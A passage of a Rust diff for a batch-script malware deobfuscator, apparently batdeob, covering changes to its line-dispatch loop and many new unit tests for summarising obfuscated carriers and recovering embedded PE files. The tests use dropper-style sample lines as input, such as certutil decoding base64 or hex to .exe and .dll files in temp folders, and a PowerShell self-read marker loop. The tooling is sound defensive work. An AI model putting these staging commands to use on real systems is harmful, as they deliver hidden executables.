+            let raw_needs_pre_dispatch = expanded_line_needs_raw_pre_dispatch(&cmd);
+            let fast_direct_normalized = if raw_marker_set_consumed {
+                None
+            } else {
+                fast_expand_delayed_set_alias_line(&cmd, env)
+            };
+            let fast_simple_normalized = if raw_marker_set_consumed
+                || fast_direct_normalized.is_some()
+                || raw_needs_pre_dispatch
+            {
+                None
+            } else {
+                fast_expand_simple_percent_line(&cmd, env)
+            };
+            let pre = if let Some(pre) = raw_marker_set_pre {
+                pre
+            } else if fast_direct_normalized.is_some() || fast_simple_normalized.is_some() {
+                interp::PreDispatch::default()
+            } else {
+                interp::pre_dispatch(&cmd, env)
+            };
 
-            let toks = lex::lex(&cmd);
-            let normalized = normalize::normalize_to_string(&toks, env);
+            let normalized = if let Some(normalized) = fast_direct_normalized {
+                normalized
+            } else if let Some(normalized) = fast_simple_normalized {
+                normalized
+            } else {
+                let toks = lex::lex(&cmd);
+                normalize::normalize_to_string(&toks, env)
+            };
+            let normalized = repair_powershell_launcher_flag_spacing(normalized);
+            let normalized = if normalized.contains('%') {
+                fast_expand_simple_percent_line(&normalized, env).unwrap_or(normalized)
+            } else {
+                normalized
+            };
             env.pending_action = None;
             // Only dispatch via interpret_line if NOT already consumed by pre_dispatch.
             if !pre.consumed {
@@ -10803,7 +25015,28 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             // line above; suppress the deob append once the line has been
             // visited more than GOTO_LOOP_ELIDE_AFTER times. Handlers
             // still run, so IOCs aren't lost.
-            if !line_output_elided {
+            let suppress_after_halt_word_salad =
+                after_top_level_halt && is_plain_word_salad_after_halt(&normalized);
+            let suppress_rendered_output = pre.suppress_normalized_output
+                || (suppress_set_dictionary_output
+                    && single_char_set_assignment(&normalized).is_some())
+                || (suppress_setp_staging_output && set_assignment(&normalized).is_some())
+                || (!raw_marker_set_consumed && is_short_fragment_set_spam(&normalized, env))
+                || is_inert_fragment_value_noise(&normalized)
+                || suppress_after_halt_word_salad;
+            if suppress_rendered_output {
+                if suppress_after_halt_word_salad {
+                    if normalized.len() >= 1024 {
+                        rescue_truncated_urls(&normalized, normalized.len(), env);
+                        env.traits.push(crate::traits::Trait::LineTruncated {
+                            original_len: normalized.len() as u64,
+                        });
+                    }
+                } else {
+                    record_suppressed_line_cap(&normalized, env);
+                }
+            }
+            if !line_output_elided && !suppress_rendered_output {
                 let normalized_capped = cap_line(normalized, env);
                 out.push_str(&normalized_capped);
                 out.push_str("\r\n");
@@ -10871,6 +25104,7 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
                     // Bare `exit` at top level — same as PopFrame: continue scanning.
                     // (Inside a call frame this would propagate to the parent drive(),
                     // but Plan D defers that nuance — top-level only for now.)
+                    after_top_level_halt = true;
                     top_level_exit = true;
                     break 'cmds;
                 }
@@ -10883,24 +25117,17 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             let pending_ps1: Vec<Vec<u8>> = std::mem::take(&mut env.exec_ps1);
             // Accumulate all children seen (for the final report).
             env.all_extracted_cmd.extend(pending_cmd.clone());
-            env.all_extracted_ps1.extend(pending_ps1);
+            for payload in pending_ps1 {
+                push_extracted_ps1_for_later_analysis(payload, env);
+            }
             for (child, child_delayed) in pending_cmd.into_iter().zip(
                 pending_cmd_delayed
                     .into_iter()
                     .chain(std::iter::repeat(false)),
             ) {
-                // Child-script cap check.
-                if env.limits.child_scripts >= env.limits.max_child_scripts {
-                    if !env
-                        .traits
-                        .iter()
-                        .any(|t| matches!(t, Trait::ChildScriptsCapped))
-                    {
-                        env.traits.push(Trait::ChildScriptsCapped);
-                    }
+                if !env.enter_child_script(&child) {
                     continue;
                 }
-                env.limits.child_scripts += 1;
                 // Apply /V:ON: enable delayed expansion for this child's context.
                 let saved_delayed = env.delayed_expansion;
                 if child_delayed {
@@ -10921,6 +25148,21 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
                 env.delayed_expansion = saved_delayed;
             }
         }
+        if let Some(padding_len) = inert_nul_padding_suffix_len {
+            render_inert_nul_padding_summary(padding_len, env, out);
+            out.push_str("\r\n");
+        }
+
+        if if_not_resolved_before != usize::MAX
+            && env
+                .traits
+                .iter()
+                .filter(|trait_| matches!(trait_, Trait::IfNotResolved { .. }))
+                .count()
+                > if_not_resolved_before
+        {
+            unresolved_if_block_depth = parenthesis_depth_delta(logical).max(1);
+        }
 
         env.suppress_until_eol = false;
 
@@ -10935,7 +25177,6 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             cursor = next_cursor;
         }
     }
-
     // Restore caller's label_index.
     env.label_index = prior_labels;
     env.limits.depth -= 1;
@@ -10997,6 +25238,34 @@ mod output_cap_tests {
             "analyze must complete bounded; got deob len {} traits {}",
             report.deobfuscated.len(),
             report.traits.len()
+        );
+    }
+
+    #[test]
+    fn inert_nul_padding_after_script_does_not_trip_output_cap() {
+        let mut script = b"@echo off\r\necho ready\r\nExit\r\n".to_vec();
+        script.extend(std::iter::repeat_n(0, 4096));
+        let cfg = Config {
+            max_output_bytes: 1024,
+            ..Config::default()
+        };
+
+        let report = analyze(&script, &cfg);
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 4096 NUL padding bytes"),
+            "NUL padding should be summarized, got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::OutputCapped { .. })),
+            "inert NUL padding should not trip OutputCapped: {:?}",
+            report.traits
         );
     }
 }
@@ -11145,9 +25414,7 @@ mod line_cap_tests {
         let report = analyze(script.as_bytes(), &Config::default());
 
         assert!(
-            report
-                .deobfuscated
-                .contains("batdeob: omitted base64 PE carrier"),
+            report.deobfuscated.contains("omitted base64 PE carrier"),
             "PE carrier was not summarized:\n{}",
             report.deobfuscated
         );
@@ -11166,6 +25433,54 @@ mod line_cap_tests {
     }
 
     #[test]
+    fn marker_prefixed_self_read_carrier_line_is_summarized() {
+        let marker = "SEROXEN";
+        let carrier = format!("{marker}{}", "A".repeat(8192));
+        let script = format!(
+            "powershell -Command \"$line='x'; if ($line.StartsWith('{marker}')) {{ $line.Substring({}) }}\"\r\n{carrier}\r\n",
+            marker.len()
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted self-read marker carrier"),
+            "marker carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&carrier[..256]),
+            "raw marker carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn marker_prefixed_chunked_self_read_carrier_line_is_summarized() {
+        let marker = "SEROXEN";
+        let carrier = format!("{marker}{}\\{}", "A".repeat(8192), "Q".repeat(4096));
+        let script = format!(
+            "powershell -Command \"$line='x'; if ($line.StartsWith('{marker}')) {{ $line.Substring({}) }}\"\r\n{carrier}\r\n",
+            marker.len()
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted self-read marker carrier"),
+            "chunked marker carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&carrier[..256]),
+            "raw chunked marker carrier leaked into deob output"
+        );
+    }
+
+    #[test]
     fn encoded_set_carrier_runs_are_summarized() {
         use std::fmt::Write as _;
 
@@ -11179,12 +25494,482 @@ mod line_cap_tests {
         let summarized = crate::summarize_encoded_set_carrier_line_runs(&text, &mut env);
 
         assert!(
-            summarized.contains("batdeob: omitted 20 encoded SET carrier lines"),
-            "carrier run was not summarized:\n{summarized}"
+            !summarized.contains("batdeob: omitted"),
+            "tool-authored carrier summary polluted runnable deob text:\n{summarized}"
         );
         assert!(
             !summarized.contains("Carrier0"),
-            "raw carrier line leaked into summary:\n{summarized}"
+            "raw carrier line leaked into deob output:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn single_long_base64_set_carrier_is_suppressed_without_banner() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let payload = "A".repeat(4096);
+        let text = format!("set \"Carrier={payload}\"\r\npowershell -NoP -Command whoami\r\n");
+
+        let summarized = crate::summarize_encoded_set_carrier_line_runs(&text, &mut env);
+
+        assert!(
+            !summarized.contains("Carrier="),
+            "single long SET carrier leaked into deob output:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("batdeob: omitted"),
+            "tool-authored carrier summary polluted runnable deob text:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("powershell -NoP"),
+            "following command was dropped:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn medium_chunked_encoded_set_carrier_runs_are_suppressed() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::new();
+        for idx in 0..80 {
+            writeln!(
+                text,
+                "set \"frag{idx:03}=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo{idx:03}\""
+            )
+            .expect("write to string");
+        }
+        text.push_str("powershell -NoP -Command Write-Host done\r\n");
+
+        let summarized = crate::summarize_encoded_set_carrier_line_runs(&text, &mut env);
+
+        assert!(
+            !summarized.contains("frag000"),
+            "chunked SET carrier leaked into deob output:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("batdeob: omitted"),
+            "tool-authored carrier summary polluted runnable deob text:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("powershell -NoP"),
+            "following command was dropped:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn generated_nonascii_set_scaffold_runs_are_summarized() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::new();
+        for idx in 0..12 {
+            writeln!(
+                text,
+                "@set \"_\u{fffd}\u{fffd}{idx}=9dezNxtwUuPTXvfAgaiICKVnpQb1D058ZmL7EW yMqoh4F6@3cY2krjRGSlJHBsO\""
+            )
+            .expect("write to string");
+        }
+        text.push_str("set \"piZvOnAfpq=s://\"\r\n");
+        text.push_str("certutil -decodehex sample.bat C:\\Users\\Public\\pointer.com 3\r\n");
+
+        let summarized = crate::summarize_generated_nonascii_set_scaffold_runs(&text, &mut env);
+
+        assert!(
+            summarized.contains("generated non-ASCII set scaffold lines"),
+            "generated scaffold summary missing:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("9dezNxtwUuPTXvf"),
+            "raw generated scaffold leaked:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("set \"piZvOnAfpq=s://\"")
+                && summarized.contains("certutil -decodehex"),
+            "real commands were dropped:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn corpus_marker_chunked_set_carrier_line_is_recognized() {
+        assert!(crate::is_chunked_encoded_set_fragment_line(
+            r#"set "hmckjiv=B6AHIAYwBSAHQAdAB0ADkAUABTAEwAQgArpyqhxm""#
+        ));
+    }
+
+    #[test]
+    fn recovered_dropper_set_carrier_lines_are_suppressed() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::MultiStageEncryptedDropper {
+            marker: "rpyqhxmsxdzi".to_string(),
+            b64_length: 1024,
+            has_aes_cbc: false,
+            has_gzip_stage: false,
+            reads_self_lines: false,
+            aes_key_b64: None,
+            aes_iv_b64: None,
+            nested_aes: Vec::new(),
+            assemblies_recovered: Some(1),
+        });
+        let text = concat!(
+            "set \"hmckjiv=B6AHIAYwBSAHQAdAB0ADkAUABTAEwAQgArpyqhxm\"\r\n",
+            "set \"locnmxp=ace('rpyqhxmsxdzi','')))))\"\"\"\r\n",
+            "powershell -NoP -Command Write-Host done\r\n",
+        );
+
+        let summarized = crate::suppress_recovered_dropper_set_carrier_lines(text, &mut env)
+            .expect("carrier lines should be suppressed");
+
+        assert!(
+            !summarized.contains("hmckjiv") && !summarized.contains("locnmxp"),
+            "recovered carrier lines leaked into output:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("powershell -NoP"),
+            "following command was dropped:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn recovered_dropper_short_named_set_carrier_lines_are_suppressed() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::MultiStageEncryptedDropper {
+            marker: "zvzrdidyvslx".to_string(),
+            b64_length: 1024,
+            has_aes_cbc: false,
+            has_gzip_stage: false,
+            reads_self_lines: false,
+            aes_key_b64: None,
+            aes_iv_b64: None,
+            nested_aes: Vec::new(),
+            assemblies_recovered: Some(1),
+        });
+        let text = concat!(
+            "set \"pim=BVAEkAdwBoAEQAVwBlAzvzrdidyvslxHgATgBLAEMAMgB6\"\r\n",
+            "set \"kbp=AdABCAFQAdwA4AHQAWQAxAEoAQQBnAEEAQQzvzrdidyvslxAn\"\r\n",
+            "powershell -NoP -Command Write-Host done\r\n",
+        );
+
+        let summarized = crate::suppress_recovered_dropper_set_carrier_lines(text, &mut env)
+            .expect("short named carrier lines should be suppressed");
+
+        assert!(
+            !summarized.contains("pim=") && !summarized.contains("kbp="),
+            "short named recovered carrier lines leaked into output:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("powershell -NoP"),
+            "following command was dropped:\n{summarized}"
+        );
+    }
+
+    #[test]
+    fn materialized_medium_chunked_encoded_set_carrier_runs_are_suppressed() {
+        use std::fmt::Write as _;
+
+        let mut script = String::from("setlocal enabledelayedexpansion\r\n");
+        for idx in 0..80 {
+            writeln!(
+                script,
+                "set \"frag{idx:03}=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVorpyqhxmsxdzi{idx:03}\""
+            )
+            .expect("write to string");
+        }
+        script.push_str("powershell -NoP -Command Write-Host done\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            !report.deobfuscated.contains("frag000"),
+            "materialized chunked SET carrier leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("batdeob: omitted"),
+            "tool-authored carrier summary polluted runnable deob text:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("powershell -NoP"),
+            "following command was dropped:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn large_short_set_fragment_runs_are_suppressed_without_banner() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::new();
+        for idx in 0..40 {
+            write!(text, "set \"Frag{idx}=AA\"\r\n").expect("write to string");
+        }
+        text.push_str("powershell -NoP -Command Write-Host done\r\n");
+
+        let suppressed = crate::suppress_short_set_fragment_line_runs(&text, &mut env);
+
+        assert!(
+            !suppressed.contains("Frag0"),
+            "short SET carrier run leaked into deob output:\n{supressed}",
+            supressed = suppressed
+        );
+        assert!(
+            !suppressed.contains("batdeob: omitted"),
+            "tool-authored short SET summary polluted runnable deob text:\n{supressed}",
+            supressed = suppressed
+        );
+        assert!(
+            suppressed.contains("powershell -NoP"),
+            "non-carrier command was dropped:\n{supressed}",
+            supressed = suppressed
+        );
+    }
+
+    #[test]
+    fn small_short_set_fragment_runs_are_preserved() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let text = "set \"USER=test\"\r\nset \"TEMP=C:\\\\Temp\"\r\n";
+
+        let suppressed = crate::suppress_short_set_fragment_line_runs(text, &mut env);
+
+        assert_eq!(suppressed, text);
+    }
+
+    #[test]
+    fn unreferenced_extracted_short_set_fragments_are_suppressed() {
+        let text = concat!(
+            "set \"RandomCarrierNameAlphaBetaGammaDelta=s\"\r\n",
+            "set \"RandomCarrierNameEpsilonZetaEtaTheta=t\"\r\n",
+            "set \"RandomCarrierNameIotaKappaLambdaMu=e\"\r\n",
+            "set \"dlcmd_20_gMwliJcjdg= \"\"\r\n",
+            "set \"dlcmd_21_bvXjslSKlX=\"In\"\r\n",
+            "set \"dlcmd_57_IMPJpjFfeTv=\"\"\"\r\n",
+            "set \"KEEP=x\"\r\n",
+            "echo !KEEP!\r\n",
+            "powershell -NoP -Command Write-Host done\r\n",
+        );
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.all_extracted_ps1.push(b"function Payload {}".to_vec());
+        let suppressed = crate::suppress_unreferenced_extracted_short_set_fragments(text, &env);
+
+        assert!(
+            !suppressed.contains("RandomCarrierName"),
+            "unreferenced short SET fragments leaked into deob output:\n{supressed}",
+            supressed = suppressed
+        );
+        assert!(
+            !suppressed.contains("dlcmd_"),
+            "unreferenced quote-fragment SET staging leaked into deob output:\n{supressed}",
+            supressed = suppressed
+        );
+        assert!(
+            suppressed.contains("set \"KEEP=x\""),
+            "referenced short SET assignment was dropped:\n{supressed}",
+            supressed = suppressed
+        );
+        assert!(
+            suppressed.contains("powershell -NoP"),
+            "following command was dropped:\n{supressed}",
+            supressed = suppressed
+        );
+    }
+
+    #[test]
+    fn unreferenced_long_set_scaffolding_runs_are_summarized() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::new();
+        for idx in 0..70 {
+            let value = if idx == 35 {
+                "://".to_string()
+            } else {
+                format!("junk{idx:02}")
+            };
+            write!(
+                text,
+                "set \"QYapFDgiqYPAYfcskxIptILMU{idx:02}={value}\"\r\n"
+            )
+            .expect("write to string");
+        }
+        text.push_str("set \"QYapFDgiqYPAYfcskxIptILMU_ref=keep\"\r\n");
+        text.push_str("echo %QYapFDgiqYPAYfcskxIptILMU_ref%\r\n");
+        text.push_str("mkdir hjbnjlkossoos\r\n");
+
+        let summarized = crate::summarize_unreferenced_long_set_scaffolding_runs(&text, &mut env);
+
+        assert!(
+            summarized.contains("rem omitted 70 unreferenced long-name set scaffolding lines"),
+            "summary missing:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("QYapFDgiqYPAYfcskxIptILMU00=junk00"),
+            "unreferenced scaffold leaked:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("set \"QYapFDgiqYPAYfcskxIptILMU_ref=keep\"")
+                && summarized.contains("echo %QYapFDgiqYPAYfcskxIptILMU_ref%")
+                && summarized.contains("mkdir hjbnjlkossoos"),
+            "referenced set or following commands were dropped:\n{summarized}"
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::LineTruncated { .. })),
+            "expected LineTruncated trait for summarized scaffolding"
+        );
+    }
+
+    #[test]
+    fn interleaved_unreferenced_long_set_scaffolding_is_summarized() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..72 {
+            write!(
+                text,
+                "set \"NoiseCarrierScaffoldName{idx:03}=alphabeticalpayload{idx:03}filler{{[_]}}\"\r\n"
+            )
+            .expect("write to string");
+            if idx % 4 == 0 {
+                write!(text, ":Label{idx:03}\r\ngoto :LabelNext{idx:03}\r\n")
+                    .expect("write to string");
+            }
+            if idx == 20 {
+                text.push_str("powershell -c \"Write-Host kept\"\r\n");
+            }
+        }
+        text.push_str("set \"NoiseCarrierScaffoldName_ref=keep\"\r\n");
+        text.push_str("echo %NoiseCarrierScaffoldName_ref%\r\n");
+
+        let summarized = crate::summarize_unreferenced_long_set_scaffolding_runs(&text, &mut env);
+
+        assert!(
+            summarized.contains("rem omitted 72 unreferenced long-name set scaffolding lines"),
+            "interleaved scaffold summary missing:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("NoiseCarrierScaffoldName020=alphabeticalpayload020"),
+            "interleaved scaffold leaked:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("powershell -c \"Write-Host kept\"")
+                && summarized.contains("set \"NoiseCarrierScaffoldName_ref=keep\"")
+                && summarized.contains("echo %NoiseCarrierScaffoldName_ref%"),
+            "real commands or referenced set were dropped:\n{summarized}"
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::LineTruncated { .. })),
+            "expected LineTruncated trait for summarized interleaved scaffolding"
+        );
+    }
+
+    #[test]
+    fn dense_short_unreferenced_set_scaffolding_is_summarized() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..72 {
+            write!(
+                text,
+                "set \"carrier_{idx:03}=alphabeticalpayload{idx:03}{{[_]}}\"\r\n"
+            )
+            .expect("write to string");
+            if idx == 20 {
+                text.push_str("set \"KEEP_PATH=C:\\\\Windows\"\r\n");
+                text.push_str("echo %KEEP_PATH%\r\n");
+            }
+        }
+
+        let summarized = crate::summarize_unreferenced_long_set_scaffolding_runs(&text, &mut env);
+
+        assert!(
+            summarized.contains("rem omitted 72 unreferenced set scaffolding lines"),
+            "dense short set summary missing:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("carrier_020=alphabeticalpayload020"),
+            "dense short set scaffold leaked:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("set \"KEEP_PATH=C:\\\\Windows\"")
+                && summarized.contains("echo %KEEP_PATH%"),
+            "referenced set assignment was dropped:\n{summarized}"
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::LineTruncated { .. })),
+            "expected LineTruncated trait for summarized dense short set scaffolding"
+        );
+    }
+
+    #[test]
+    fn dense_unresolved_control_flow_noise_is_summarized_without_hiding_commands() {
+        use std::fmt::Write as _;
+
+        let mut env = crate::env::Environment::new(&Config::default());
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..68 {
+            write!(
+                text,
+                ":RandomLabelCarrier{idx:03}\r\n\
+                 goto :NextRandomLabelCarrier{idx:03}\r\n\
+                 if 1==1 goto :AlwaysRandomLabelCarrier{idx:03}\r\n\
+                 If %ERRORLEVEL% LSS 1 echo filler marker text {idx:03} 2>nul\r\n\
+                 echo filler marker text {idx:03} 2>nul\r\n"
+            )
+            .expect("write to string");
+            if idx == 20 {
+                text.push_str("powershell -c \"Write-Host kept\"\r\n");
+            }
+        }
+        text.push_str("rem omitted residual opaque base64 carrier line (128 bytes)\r\n");
+
+        let summarized =
+            crate::summarize_dense_unresolved_control_flow_noise_lines(&text, &mut env)
+                .expect("expected dense control-flow noise summary");
+
+        assert!(
+            summarized.contains("rem omitted 340 dense unresolved control-flow noise lines"),
+            "summary missing:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("RandomLabelCarrier020"),
+            "random label/goto scaffold leaked:\n{summarized}"
+        );
+        assert!(
+            !summarized.contains("filler marker text 020"),
+            "echo-to-nul scaffold leaked:\n{summarized}"
+        );
+        assert!(
+            summarized.contains("powershell -c \"Write-Host kept\"")
+                && summarized.contains("rem omitted residual opaque base64 carrier line"),
+            "real command or existing payload summary was dropped:\n{summarized}"
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::LineTruncated { .. })),
+            "expected LineTruncated trait for summarized control-flow noise"
+        );
+    }
+
+    #[test]
+    fn dense_control_flow_noise_scan_handles_non_ascii_lines() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let text = ":ظزسعبخظقننفغكزؤشهزحسپملولتدتكیفگلجهلخلنیگحلؤحخةلعیكعقهینالللرفاخلزشسیسۆشالهيشلؤنهندةاازعدثهحءلمفویظلايعسجیلمحطبفىگعكلگللمىیدچعج\r\n";
+
+        let summarized = crate::summarize_dense_unresolved_control_flow_noise_lines(text, &mut env);
+
+        assert!(
+            summarized.is_none(),
+            "non-ASCII label should not be treated as dense control-flow noise"
         );
     }
 
@@ -11361,7 +26146,7 @@ mod line_cap_tests {
         assert!(
             report
                 .deobfuscated
-                .contains("batdeob: omitted multiline base64 PE carrier"),
+                .contains("omitted multiline base64 PE carrier"),
             "multiline PE carrier was not summarized:\n{}",
             report.deobfuscated
         );
@@ -11415,7 +26200,7 @@ mod line_cap_tests {
         assert!(
             report
                 .deobfuscated
-                .contains("batdeob: omitted multiline base64-encoded hex PE carrier"),
+                .contains("omitted multiline base64-encoded hex PE carrier"),
             "multiline base64-hex PE carrier was not summarized:\n{}",
             report.deobfuscated
         );
@@ -11434,6 +26219,934 @@ mod line_cap_tests {
                 .iter()
                 .map(|(label, blob)| (label.as_str(), blob.len()))
                 .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn one_line_hex_pe_carrier_is_summarized_and_recovered() {
+        use std::fmt::Write as _;
+
+        let mut pe = vec![0u8; 8192];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let mut hex_line = String::new();
+        for byte in &pe {
+            write!(&mut hex_line, "{byte:02x} ").unwrap();
+        }
+        let script = format!(
+            "findstr /V marker \"%0\" > payload.hex\r\n{hex_line}\r\ncertutil -decodehex payload.hex payload.dll\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted one-line hex PE carrier"),
+            "hex PE line was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&hex_line[..512]),
+            "raw hex PE line leaked into deob output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-hex-pe") && blob == &pe),
+            "one-line hex PE was not exported: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn echo_redirect_base64_pe_carrier_run_is_summarized_and_recovered() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x1000];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let mut script = String::from("@echo off\r\n");
+        for (idx, chunk) in b64.as_bytes().chunks(76).enumerate() {
+            let op = if idx == 0 { ">" } else { ">>" };
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str(op);
+            script.push_str("%tmp%\\x\r\n");
+        }
+        script.push_str("certutil -decode %tmp%\\x %tmp%\\x.exe\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted echo-redirect base64 PE carrier"),
+            "echo base64 PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..128]),
+            "raw echo base64 carrier leaked into deob output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
+            "echo base64 PE carrier was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn grouped_echo_redirect_base64_pe_carrier_is_summarized_and_recovered() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x3000];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let mut script = String::from("@echo off\r\n(\r\n");
+        for chunk in b64.as_bytes().chunks(76) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).unwrap());
+            script.push_str("\r\n");
+        }
+        script.push_str(") > %tmp%\\x\r\ncertutil -decode %tmp%\\x %tmp%\\x.exe\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted grouped echo-redirect base64 PE carrier"),
+            "grouped echo base64 PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..128]),
+            "raw grouped echo base64 carrier leaked into deob output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
+            "grouped echo base64 PE carrier was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn large_grouped_echo_redirect_pe_is_recovered_before_timeout() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 8 * 1024 * 1024];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let mut script = String::from("@echo off\r\n(\r\n");
+        for chunk in b64.as_bytes().chunks(4096) {
+            script.push_str("echo ");
+            script.push_str(std::str::from_utf8(chunk).expect("base64 ascii"));
+            script.push_str("\r\n");
+        }
+        script.push_str(
+            ") > %TEMP%\\stage.b64\r\ncertutil -decode %TEMP%\\stage.b64 %TEMP%\\stage.exe\r\n",
+        );
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 4,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|trait_| matches!(trait_, Trait::TimeoutHit)),
+            "large grouped PE carrier should not time out after recovery: {:?}",
+            report.traits
+        );
+        assert!(
+            report.recovered_pe.iter().any(|(_, blob)| blob == &pe),
+            "large grouped PE carrier was not recovered"
+        );
+    }
+
+    #[test]
+    fn grouped_echo_certificate_base64_carrier_is_summarized() {
+        use base64::Engine;
+
+        let payload = b"%PDF-1.7\n".repeat(700);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
+        let mut script = String::from("@echo off\r\n(\r\n");
+        script.push_str("echo -----BEGIN CERTIFICATE-----\r\n");
+        for chunk in b64.as_bytes().chunks(76) {
